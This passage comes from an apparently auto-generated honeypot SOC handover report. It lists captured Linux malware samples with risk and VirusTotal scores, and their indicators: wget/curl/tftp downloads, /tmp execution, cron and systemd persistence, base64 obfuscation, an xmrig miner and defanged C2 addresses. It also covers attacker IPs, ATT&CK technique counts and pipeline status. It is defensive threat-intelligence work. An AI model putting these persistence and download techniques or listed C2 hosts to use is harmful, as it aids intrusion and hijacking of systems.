| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `119.96.158[.]238` | CN | CHINANET Hubei province network | **100** ⚠️ | 50 |
| `85.11.167[.]83` | NL | TechTies Inc. | **100** ⚠️ | 4 |
| `135.125.235[.]107` | DE | OVH GmbH | **100** ⚠️ | 50 |
| `123.253.162[.]254` | IN | Ishan Netsol Pvt Ltd | **100** ⚠️ | 50 |
| `66.132.159[.]105` | US | Censys, Inc. | **100** ⚠️ | 5 |
| `37.55.229[.]70` | UA | JSC Ukrtelecom | **100** ⚠️ | 1 |
| `66.132.195[.]50` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `40.119.27[.]186` | US | Microsoft Corporation | **100** ⚠️ | 5 |
| `20.112.236[.]72` | US | Microsoft Corporation | **100** ⚠️ | 5 |
| `154.83.17[.]226` | HK | Yisu Cloud Ltd | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 210 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 194 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 85 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 53 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 38 |

---

## 🔕 False Positive Summary (45 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 15 |
| AbuseIPDB score 16 below threshold 25 | 5 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 20 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 367 cases |
| Tool 34  | Credential Extractor        | ✅ 901 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 21 fingerprints |
| Tool 36  | Command Clustering          | ✅ 53 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 215 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 45 filtered (12.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 108 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 190 priority case(s) shown individually · 119 recon entry/entries in table (8 group(s) consolidating 21 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-01T17:25:17Z_
